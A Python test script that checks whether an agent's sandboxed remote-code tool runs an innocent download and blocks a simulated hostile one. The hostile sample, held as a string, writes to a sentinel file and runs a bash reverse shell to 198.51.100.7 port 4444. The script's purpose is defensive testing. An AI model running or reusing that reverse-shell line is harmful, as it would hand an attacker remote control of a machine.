from __future__ import annotations

import argparse
import hashlib
import json
from pathlib import Path

from ralfloop_agent.model_tools import ModelToolManager, ModelToolRegistry
from ralfloop_agent.model_tools.remote_code import (
    RemoteCodeArtifact,
    SandboxedRemoteCodeTool,
)


class _SimulatedHostileDownload:
    def __init__(self, sentinel: Path) -> None:
        self.source = (
            f"open({str(sentinel)!r}, 'w').write('modified')\n"
            "import os\n"
            "os.system('bash -i >& /dev/tcp/198.51.100.7/4444 0>&1')\n"
        ).encode("utf-8")

    def fetch(self, url: str) -> RemoteCodeArtifact:
        return RemoteCodeArtifact(
            source=self.source,
            source_url="https://hostile.invalid/simulated.py",
            final_url="https://hostile.invalid/simulated.py",
            content_type="text/x-python",
            peer_ip="203.0.113.7",
            sha256=hashlib.sha256(self.source).hexdigest(),
            size_bytes=len(self.source),
            fetched_at="simulated",
        )


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--registry", default="config/model_tools.json")
    parser.add_argument("--innocent-url", required=True)
    parser.add_argument("--state-dir", required=True)
    args = parser.parse_args()

    state = Path(args.state_dir).resolve()
    state.mkdir(parents=True, exist_ok=True, mode=0o700)
    sentinel = state / "host-sentinel.txt"
    sentinel.write_text("unchanged", encoding="utf-8")
    sentinel.chmod(0o600)
    before = hashlib.sha256(sentinel.read_bytes()).hexdigest()

    registry = ModelToolRegistry.load(args.registry)
    innocent = ModelToolManager(registry).invoke(
        "sandboxed_remote_code",
        {"url": args.innocent_url, "interpreter": "python3"},
    ).model_dump(mode="json")
    hostile = SandboxedRemoteCodeTool(
        downloader=_SimulatedHostileDownload(sentinel)
    ).run({"url": "https://hostile.invalid/simulated.py"})
    after = hashlib.sha256(sentinel.read_bytes()).hexdigest()

    result = {
        "ok": (
            innocent["ok"]
            and innocent["output"].get("classification") == "safe"
            and innocent["output"].get("executed") is True
            and innocent["output"].get("cleanup") is True
            and hostile.get("classification") == "blocked"
            and hostile.get("executed") is False
            and hostile.get("cleanup") is True
            and before == after
        ),
        "host_sentinel_sha256_before": before,
        "host_sentinel_sha256_after": after,
        "host_unchanged": before == after,
        "innocent": innocent,
        "hostile": hostile,
    }
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if result["ok"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
